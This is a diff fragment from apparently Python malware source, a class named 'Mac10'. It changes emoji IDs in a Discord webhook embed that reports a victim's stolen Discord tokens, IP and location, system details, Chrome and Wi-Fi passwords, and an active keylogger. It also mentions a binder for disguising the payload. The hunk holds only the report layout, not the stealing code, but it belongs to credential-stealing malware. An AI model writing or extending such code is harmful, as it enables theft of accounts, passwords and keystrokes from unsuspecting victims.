@@ -307,27 +307,27 @@ class Mac10:
                 "color": 0xffffff,
                         "fields": [
                             {
-                                "name": "<:zstar4:1124052448793862174> **Tokens**",
+                                "name": "<:z_logo_trustpilot:1040751302294122507> **Tokens**",
                                 "value": f"`{discord_tokens[1]}`"
                             },
                             {
-                                "name": "<:zstar4:1124052448793862174> **IP Info**",
+                                "name": "<:z_logo_trustpilot:1040751302294122507> **IP Info**",
                                 "value": f"<:wh_star:1102019798390542426>`{ip}`\n<:wh_star:1102019798390542426>`{city}`\n<:wh_star:1102019798390542426>`{country}`\n<:wh_star:1102019798390542426>`{region}`"
                             },
                             {
-                                "name": "<:zstar4:1124052448793862174> **System Information**",
+                                "name": "<:z_logo_trustpilot:1040751302294122507> **System Information**",
                                 "value": f"```{system_info}```"
                             },
                             {
-                                "name": "<:zstar4:1124052448793862174> **Python Version**",
+                                "name": "<:z_logo_trustpilot:1040751302294122507> **Python Version**",
                                 "value": f"```{pf.python_version()}```"
                             },
                             {
-                                "name": "<:zstar4:1124052448793862174> **KeyLogger is Active at an Interval of 40 seconds**",
+                                "name": "<:z_logo_trustpilot:1040751302294122507> **KeyLogger is Active at an Interval of 40 seconds**",
                                 "value": f"```if you dont see anykey logs within the server after 40\nseconds then you need Mercrial Binder <33````"
                             },
                             {
-                                "name": "<:zstar4:1124052448793862174> **System Files**",
+                                "name": "<:z_logo_trustpilot:1040751302294122507> **System Files**",
                                 "value": f"<:wh_star:1102019798390542426>**{discord_tokens[0]}**\n<:wh_star:1102019798390542426>**{wifi_passwords}**\n<:wh_star:1102019798390542426>**{chrome_passwords}**\n<:wh_star:1102019798390542426>**{self.ErrorLog()}**"
                             },
                         ],
